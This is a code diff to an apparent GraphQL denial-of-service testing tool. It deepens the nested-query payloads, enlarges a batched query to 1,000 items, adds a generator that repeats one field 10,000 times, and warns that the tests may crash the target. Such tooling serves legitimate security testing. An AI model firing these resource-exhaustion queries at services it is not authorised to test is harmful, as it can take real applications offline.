@@ -135,7 +135,7 @@ class root():
         """
 
         # Build up nested levels
-        for _ in range(5):
+        for _ in range(10):
             nested_query = f"""
             {base_ref['field']} {{
                 id
@@ -163,6 +163,27 @@ class root():
 
         return full_query
 
+    def generateFieldDuplication(self) -> str:
+        """
+        Generate a query with duplicated fields based on schema.
+        """
+        if not self.query_type or not self.types.get(self.query_type):
+            return ""
+
+        # Get all scalar fields from the query type
+        scalar_fields = []
+        for field in self.types[self.query_type]['fields']:
+            field_type = field['type'].get('name')
+            if field_type in ['String', 'Int', 'Float', 'Boolean', 'ID']:
+                scalar_fields.append(field['name'])
+
+        if not scalar_fields:
+            return ""
+
+        # Duplicate the first scalar field many times
+        duplicated_field = f"{scalar_fields[0]}\n" * 10000
+        return f"query {{ {duplicated_field} }}"
+
     def generateObjectOverride(self) -> str:
         """
         Generate a deeply nested query based on schema types.
@@ -181,7 +202,7 @@ class root():
             return ""
 
         # Create deeply nested query
-        nested_levels = 50
+        nested_levels = 100
         current_query = "id"
         for _ in range(nested_levels):
             current_query = f"""
@@ -213,7 +234,7 @@ class root():
                 }}
             }}
             """
-        } for _ in range(100)]
+        } for _ in range(1000)]
 
     async def setEndpoint(self, endpoint: str, proxy_string: Optional[str] = None) -> bool:
         """
@@ -322,8 +343,9 @@ class root():
             return
         
         print()
-        self.message.printMsg(f"Testing endpoint: {self.endpoint} for DOS attacks", status="success")
-        
+        self.message.printMsg(f"Testing endpoint {self.endpoint} for DOS attacks", status="success")
+        self.message.printMsg(f"These tests may crach the application. Please proxy in Burp for further Analysis.", status="warning")
+
         async with aiohttp.ClientSession() as session:
             tests = [
                 ("Circular Query DoS", self.testCircularQuery),
@@ -336,16 +358,3 @@ class root():
                 is_vulnerable, duration = await test_func(session)
                 self.printVulnerabilityDetails(vuln_type, is_vulnerable, duration)
                 await asyncio.sleep(10)
-
-# async def main():
-#     dos_tester = grapeDos()
-    
-#     # First set the endpoint and get schema
-#     if await dos_tester.setEndpoint("http://127.0.0.1:5013/graphql", "127.0.0.1:8080"):
-#         # Then run the DOS tests
-#         await dos_tester.test_endpoint_dos()
-#     else:
-#         print("Failed to set endpoint or retrieve schema")
-
-# if __name__ == "__main__":
-#     asyncio.run(main())
